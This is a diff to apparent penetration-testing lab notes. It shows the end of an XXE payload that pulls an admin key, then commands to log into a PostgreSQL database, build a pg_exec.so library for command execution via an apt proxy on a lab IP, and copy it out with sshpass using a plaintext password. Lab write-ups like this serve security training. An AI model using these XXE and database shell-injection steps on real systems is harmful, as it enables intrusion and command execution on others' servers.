@@ -207,5 +207,17 @@ Here we can get the admin key
   ]>
   <database><categories><category><name>&key;</name></category></categories></database>
 ```
-
+logging into the answers sql db
+```bash
 psql -U webapp -d answers -h localhost -p 5432
+```
+proxying apt updates to compile the .so for shell injection
+```bash
+sudo apt -o Acquire::http::proxy="http://192.168.119.123:3128" install postgresql-server-dev-10
+sudo apt -o Acquire::http::proxy="http://192.168.119.123:3128" install gcc
+gcc -I /usr/include/postgresql/10/server/ -shared -fPIC -o pg_exec.so pg_exec.c
+```
+grabbing the newly created so
+```bash
+sshpass -p studentlab scp student@answers:~/temp/pg_exec.so .
+```
